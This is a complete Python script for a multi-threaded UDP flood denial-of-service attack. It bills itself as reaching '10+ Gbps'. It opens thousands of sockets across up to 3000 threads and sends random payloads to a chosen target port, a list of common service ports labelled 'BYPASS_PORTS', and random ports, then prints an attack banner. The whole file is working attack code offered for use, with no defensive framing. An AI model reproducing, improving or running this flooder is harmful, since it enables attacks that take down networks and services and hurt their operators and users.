#!/usr/bin/env python3
"""
🔥 UDP-PPS - 10+ Gbps UDP Flood 🔥
Optimized for maximum packets per second
"""

import socket
import random
import sys
import time
import threading
import os

target = sys.argv[1]
port = int(sys.argv[2])
duration = int(sys.argv[3])
threads = int(sys.argv[4]) if len(sys.argv) > 4 else 3000

# ============================================================
# OPTIMIZED SETTINGS
# ============================================================

MAX_PACKET = 65507
PACKET_SIZE = 1472  # Optimal size for max PPS
BYPASS_PORTS = [53, 80, 443, 8080, 8443, 123, 161, 389, 3306, 21, 22, 25, 110, 143, 993, 995]

# ============================================================
# PRE-COMPUTED PAYLOADS
# ============================================================

PAYLOADS = [random._urandom(PACKET_SIZE) for _ in range(10)]

# ============================================================
# SOCKET CREATE
# ============================================================

def create_socket():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024*8)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1024*1024*8)
        s.setblocking(False)
        return s
    except:
        return socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# ============================================================
# UDP PPS FLOOD WORKER
# ============================================================

def udp_pps_worker(thread_id):
    try:
        sockets = []
        for i in range(15):
            s = create_socket()
            if s:
                sockets.append(s)
        
        if not sockets:
            return
        
        end_time = time.time() + duration
        packet_count = 0
        payload_idx = 0
        
        while time.time() < end_time:
            try:
                for s in sockets:
                    payload = PAYLOADS[payload_idx % len(PAYLOADS)]
                    s.sendto(payload, (target, BYPASS_PORTS[packet_count % len(BYPASS_PORTS)]))
                    s.sendto(payload, (target, port))
                    s.sendto(payload, (target, random.randint(1, 65535)))
                    packet_count += 3
                    payload_idx += 1
                
                if packet_count % 10000 == 0:
                    sys.stderr.write(f"UDP-PPS #{thread_id}: {packet_count} packets\n")
            except:
                pass
        
        for s in sockets:
            try:
                s.close()
            except:
                pass
        sys.stderr.write(f"UDP-PPS #{thread_id} completed\n")
    except:
        pass

print(f"""
╔═══════════════════════════════════════════════════════════════╗
║  🔥 UDP-PPS - Maximum Packets Per Second 🔥                 ║
╠═══════════════════════════════════════════════════════════════╣
║  Target: {target}:{port}                                     ║
║  Duration: {duration}s                                       ║
║  Threads: {threads}                                          ║
║  Sockets per thread: 15                                     ║
║  Total sockets: {threads * 15}                              ║
║  Packet size: {PACKET_SIZE} bytes                           ║
║  Method: Multi-socket UDP flood                             ║
╚═══════════════════════════════════════════════════════════════╝
""")

for i in range(threads):
    threading.Thread(target=udp_pps_worker, args=(i,), daemon=True).start()

time.sleep(duration + 2)
